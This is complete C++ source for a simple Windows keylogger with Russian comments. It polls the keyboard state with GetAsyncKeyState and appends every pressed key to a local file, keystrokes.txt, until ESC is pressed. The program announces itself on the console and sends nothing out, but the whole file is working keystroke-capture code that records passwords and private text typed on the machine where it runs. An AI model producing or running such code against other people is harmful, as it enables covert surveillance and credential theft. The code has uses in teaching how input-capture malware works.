#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

void clearLogFile()
{
    ofstream logfile;
    logfile.open("keystrokes.txt", ios::trunc); // Открытие файла в режиме перезаписи (очистка файла)

    if (!logfile.is_open()) // Проверка, удалось ли открыть файл
    {
        cout << "Не удалось открыть файл для очистки." << endl;
        return;
    }

    logfile.close(); // Закрытие файла
}

void logKeys()
{
    ofstream logfile;
    logfile.open("keystrokes.txt", ios::app); // Открытие файла в режиме дополнения (append)

    if (!logfile.is_open()) // Проверка, удалось ли открыть файл
    {
        cout << "Не удалось открыть файл для записи." << endl;
        return;
    }

    int previousKey = -1; // Переменная для хранения предыдущей нажатой клавиши

    while (true)
    {
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) // Проверка, нажата ли клавиша ESC для выхода из программы
        {
            cout << "Программа завершена." << endl;
            break;
        }

        for (int i = 8; i <= 255; i++) // Перебор кодов клавиш от 8 до 255
        {
            if (GetAsyncKeyState(i) & 0x8000) // Проверка, нажата ли текущая клавиша
            {
                if (i != previousKey) // Проверка, отличается ли текущая клавиша от предыдущей
                {
                    logfile << char(i) << endl; // Запись кода нажатой клавиши в файл
                    previousKey = i; // Обновление значения предыдущей клавиши
                }
            }
        }
    }

    logfile.close(); // Закрытие файла
}

int main()
{
    setlocale(LC_ALL, "rus");
    clearLogFile(); // Очистка файла перед записью клавиш
    cout << "Программа начала запись клавиш. Для остановки нажмите ESC." << endl;
    logKeys(); // Вызов функции для записи клавиш

    return 0;
}
